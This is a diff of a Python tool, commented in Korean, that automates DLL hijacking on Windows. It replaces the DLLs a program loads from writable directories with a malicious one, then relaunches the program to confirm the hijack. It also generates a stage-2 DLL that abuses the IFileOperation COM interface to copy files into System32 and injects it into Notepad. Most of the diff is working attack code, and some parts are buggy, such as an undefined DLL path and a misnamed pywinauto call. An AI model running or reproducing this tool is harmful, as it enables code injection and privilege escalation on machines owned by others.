@@ -1,9 +1,10 @@
-import os
+import os, signal
+from tqdm import tqdm
 from pyinjector import inject
 import subprocess
 import psutil
 import shutil
-from pywinauto import Application
+from pywinauto import *
 import time
 class hiJacking():
     def hiJacking(self):
@@ -45,7 +46,9 @@ class hiJacking():
                     list_programs.append(i)
                 if i.endswith(".dll"):
                     list_dlls.append(i)   
-            program_name = list_programs[0]
+            for i in list_programs:
+                if i.startswith("C:/"):
+                    program_name = i
         except:
             print("Wrong pid...")
         return program_name, list_dlls
@@ -89,24 +92,39 @@ class hiJacking():
                 return False
     #exe파일을 직접 실행하여 pid를 가져옴
     def create_process(self,path):
-    
-        try:
-          pid = subprocess.Popen([path]).pid
-        except:
-            print("Wrong EXE Path!")
-            exit(0)
-        return pid
+            return subprocess.Popen([path]).pid
         
     #악성 dll을 입력받은 경로로 바꿔줌
-    def change_dll(self,dll_path,hijactable_dll_path):
+    def change_dll(self,dll_path,hijactable_dll_path,program_name):
+        successed_list = []
         try:
+            tmp = os.environ['TMP']
             for i in hijactable_dll_path:
-                os.remove(i)
-                shutil.copy2(dll_path,i)
                 
-        except:
+                original_name_list = i.split('/')
+                original_name = original_name_list[-1]
+                path = tmp.replace("\\","/") + "/" + original_name
+                dir_path = os.path.dirname(i)
+                shutil.move(i,tmp)
+                shutil.copy2(dll_path,i)
+                pid = dll_hijact.create_process(program_name)
+                app = application.Application()
+                app.connect(process=pid)
+                
+                try:
+                    message = app.window(title_re="SECU") 
+                    message.OKButton.click()
+                    successed_list.append(i)
+                    psutil.Process(pid).kill()
+                except:
+                    pass
+                time.sleep(0.1)  # import time
+                os.remove(i)
+                shutil.move(path,dir_path)
+        except Exception as e:
             print("Cannot remove or write DLL")
-            
+            print(e)
+        return successed_list
     def search_order_hijack(self,pid):
         program_name, list_dlls = self.list_dll(pid)
         program_path = os.path.dirname(program_name)
@@ -160,32 +178,37 @@ class hiJacking():
         
     # 사전 검사를 통해 dll Hijacking에 취약한지 확인하여 공격을 함
     # 다만 이것이 일관성(모든 경우에 해당하는) 탐지 및 공격 방법인지는 검증 필요
-    def normal_hijack(self):
-        path_exe = "C:/Users/codeb/Desktop/ExamDLL/CreateDLL/x64/Debug/MainDLL.exe"
-        path_dll = "C:/Users/codeb/Desktop/CreateDLL.dll"
-        pid = self.create_process(path_exe)
+    def normal_hijack(self,pid):
+        successed_list = []
         program_name, list_dlls = self.list_dll(pid)
         file_list,dir_list = self.check_permission(list_dlls)
-        if not len(file_list) == 0:
+        if not len(dir_list) == 0:
             if self.find_string(program_name,file_list,dir_list):
                 print("Detect programs vulnerable to dll injection")
-                print("Vulnerable PID : " + str(pid))
-                os.system('taskkill /f /pid '+str(pid))
-                self.change_dll(path_dll,dir_list,pid)
+                
+                print("Vulnerable Program Name : " + program_name)
+                psutil.Process(pid).kill()
+                successed_list = self.change_dll(path_dll,dir_list,program_name)
+                print("Vulnerable dll Lists : ")
+                for i in successed_list:
+                    print(i)
             else:
                 print("Nah....")
         else:
             print("Not Found writable dir")
-            
-    def abusing_IfileOperation(self,exe_path,dll_path="CreateDLL.dll"):
+        return successed_list
+    
+    
+    def abusing_IfileOperation(self,exe_path,list_dlls,dll_path="CreateDLL.dll"):
         dll_abspath = ""
         if(dll_path == "CreateDLL.dll"):
             dll_abspath = os.path.dirname(__file__) + "\\" + dll_path
         else:
-            dll_abspath = dll_path        
+            dll_abspath = dll_path
+        
         #1. 익스플로러 실행하기
         
-        explore_pid = self.create_process("C:/Program Files/Internet Explorer/iexplore.exe")
+        notePad_pid = self.create_process("C:/Windows/System32/notepad.exe")
         exe_pid = self.create_process(exe_path)
         # DLL 리스트 파싱 후 원활한 파일 이동을 위해 프로세스 종료
         program_name, list_dlls = self.list_dll(exe_pid)
@@ -193,20 +216,20 @@ class hiJacking():
         # #2. IFileOperation 코드에 원하는 인자를 세팅 후 빌드 하기
         
         dll_code = """int haxproc()
-{
-	//IMPORTANT: This is an unicode dll
-	//Resolve %TEMP% path
+        {
+            //IMPORTANT: This is an unicode dll
+            //Resolve %TEMP% path
 
-	//Calls the COM interface to copy the stage 2 dll to the Windows path //C:\\Windows\\System32
-	HRESULT test = CopyItem(L"{src_path}", L"{des_path}", L"{fileName}"); //Resolve the windows path it may not be in C:
-	if (SUCCEEDED(test))
-	{
-		MessageBox(0, L"Stage-2 Installed", 0, 0);
-	}
+            //Calls the COM interface to copy the stage 2 dll to the Windows path //C:\\Windows\\System32
+            HRESULT test = CopyItem(L"{src_path}", L"{des_path}", L"{fileName}"); //Resolve the windows path it may not be in C:
+            if (SUCCEEDED(test))
+            {
+                MessageBox(0, L"Stage-2 Installed", 0, 0);
+            }
 
 
-	return 0;
-}""".format(src_path = "",des_path="",fileName="")
+            return 0;
+        }""".format(src_path = dll_abspath,des_path="",fileName="")
         
         with open("CreateIFileOperationDLL/dll.cpp",'w') as dllFile:
             dllFile.write(dll_code)
@@ -227,10 +250,10 @@ class hiJacking():
         shutil.copy2("원본 DLL 경로",dll_path)
         # 5. explore에 빌드한 dll 인젝션
         
-        inject(explore_pid,exploit_dll_path)
+        inject(notePad_pid,exploit_dll_path)
         
         # 6. 불필요한 프로세스 종료 후 하이제킹한 DLL 이 로드 될 수 있도록 실행
-        psutil.Process(explore_pid).kill()
+        psutil.Process(notePad_pid).kill()
         
         
         hijacked_pid = self.create_process(exe_path)
@@ -245,7 +268,6 @@ class hiJacking():
         except:
             print("Hijacking Fail..")
         # 8. 기본 악성 DLL에서 원래 DLL로 다시 복사(다시 IFileOperation을 이용)
-        
 class injection():
     def injection(self):
         pass
@@ -289,12 +311,15 @@ if __name__=='__main__':
     #     print(i,j)
     # os.system("cd CreateIFileOperationDLL && .\Build.bat")
     # time.sleep(2)
-    explore_pid = dll_hijact.create_process("C:/Windows/System32/notepad.exe")
+    # explore_pid = dll_hijact.create_process("C:/Windows/System32/notepad.exe")
     
-    inject(explore_pid,"CreateIFileOperationDLL/Debug/exploitDll.dll") 
-    psutil.Process(explore_pid).kill()   
+    # inject(explore_pid,"CreateIFileOperationDLL/Debug/exploitDll.dll") 
+    # time.sleep(1)
+    # psutil.Process(explore_pid).kill()   
     # os.remove("CreateIFileOperationDLL\CMakeCache.txt")
     # shutil.rmtree("CreateIFileOperationDLL\CMakeFiles")
-# 종속성 에러 방지를 위해 setup.py 작성 필요
-
-
+    f = open("CreateIFileOperationDLL/Debug/exploitDll.dll", 'r')
+    lines = f.readlines()
+    for line in lines:
+        print(line)
+    f.close()
